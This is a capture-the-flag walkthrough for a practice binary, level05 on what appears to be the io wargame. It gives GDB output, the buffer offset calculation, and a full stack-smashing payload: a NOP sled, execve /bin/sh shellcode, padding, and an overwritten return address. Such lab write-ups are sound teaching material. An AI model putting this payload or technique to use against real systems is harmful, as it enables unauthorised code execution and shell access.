Use GDB/objdump to discover the start of the buffer and the return address.

level5@io:/levels$ gdb -q ./level05
Reading symbols from /levels/level05...done.
(gdb) b main
Breakpoint 1 at 0x80483bd
(gdb) r $(python -c 'print "A"*128')
Starting program: /levels/level05 $(python -c 'print "A"*128')

Breakpoint 1, 0x080483bd in main ()
(gdb) disass
Dump of assembler code for function main:
   0x080483b4 <+0>:	push   %ebp
   0x080483b5 <+1>:	mov    %esp,%ebp
   0x080483b7 <+3>:	sub    $0xa8,%esp
=> 0x080483bd <+9>:	and    $0xfffffff0,%esp
   0x080483c0 <+12>:	mov    $0x0,%eax
   0x080483c5 <+17>:	sub    %eax,%esp
   0x080483c7 <+19>:	cmpl   $0x1,0x8(%ebp)
   0x080483cb <+23>:	jg     0x80483d9 <main+37>
   0x080483cd <+25>:	movl   $0x1,-0x8c(%ebp)
   0x080483d7 <+35>:	jmp    0x8048413 <main+95>
   0x080483d9 <+37>:	mov    0xc(%ebp),%eax
   0x080483dc <+40>:	add    $0x4,%eax
   0x080483df <+43>:	mov    (%eax),%eax
   0x080483e1 <+45>:	mov    %eax,0x4(%esp)
   0x080483e5 <+49>:	lea    -0x88(%ebp),%eax
   0x080483eb <+55>:	mov    %eax,(%esp)
   0x080483ee <+58>:	call   0x80482d4 <strcpy@plt>
   0x080483f3 <+63>:	lea    -0x88(%ebp),%eax
   0x080483f9 <+69>:	mov    %eax,0x4(%esp)
   0x080483fd <+73>:	movl   $0x8048524,(%esp)
   0x08048404 <+80>:	call   0x80482b4 <printf@plt>
   0x08048409 <+85>:	movl   $0x0,-0x8c(%ebp)
---Type <return> to continue, or q <return> to quit---
   0x08048413 <+95>:	mov    -0x8c(%ebp),%eax
   0x08048419 <+101>:	leave  
   0x0804841a <+102>:	ret    
End of assembler dump.
(gdb) b *0x080483f3
Breakpoint 2 at 0x80483f3
(gdb) c
Continuing.

Breakpoint 2, 0x080483f3 in main ()
(gdb) x/50x $esp
0xbffffba0:	0xbffffbc0	0xbffffe0f	0xb7ffeff4	0xbffffca0
0xbffffbb0:	0xb7fffac0	0xbffffc74	0xb7feb662	0xbffffc64
0xbffffbc0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffbd0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffbe0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffbf0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc00:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc10:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc20:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc30:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc40:	0x08048400	0x00000000	0xbffffcc8	0xb7e9ee16
0xbffffc50:	0x00000002	0xbffffcf4	0xbffffd00	0xb7fe19d0
0xbffffc60:	0xb7ff6821	0x0177ff8e

The buffer starts at 0xbffffbc0 (in GDB) and the return address is ebp+4, at
0xbffffc4c. The difference is 8c = 140.

We will use NOP-sled not to worry to match the exact address. We will write
sufficient NOPs and then use a shellcode, fill with 'A's and then rewrite the
return address with 0xbffffbc0 (the start address of the buffer).

We use shellcode from here:
http://www.shell-storm.org/shellcode/files/shellcode-827.php

We will use Python to write this:

python -c 'print "\x90"*61 +
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
+ "A"*56 + "\xc0\xfb\xff\xbf"' | xxd -g 4
0000000: 90909090 90909090 90909090 90909090  ................
0000010: 90909090 90909090 90909090 90909090  ................
0000020: 90909090 90909090 90909090 90909090  ................
0000030: 90909090 90909090 90909090 9031c050  .............1.P
0000040: 682f2f73 68682f62 696e89e3 505389e1  h//shh/bin..PS..
0000050: b00bcd80 41414141 41414141 41414141  ....AAAAAAAAAAAA
0000060: 41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
0000070: 41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
0000080: 41414141 41414141 41414141 c0fbffbf  AAAAAAAAAAAA....

We pass the Python command as argument to the program:
./level05 $(python -c 'print "\x90"*61 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*56 + "\xc0\xfb\xff\xbf"')
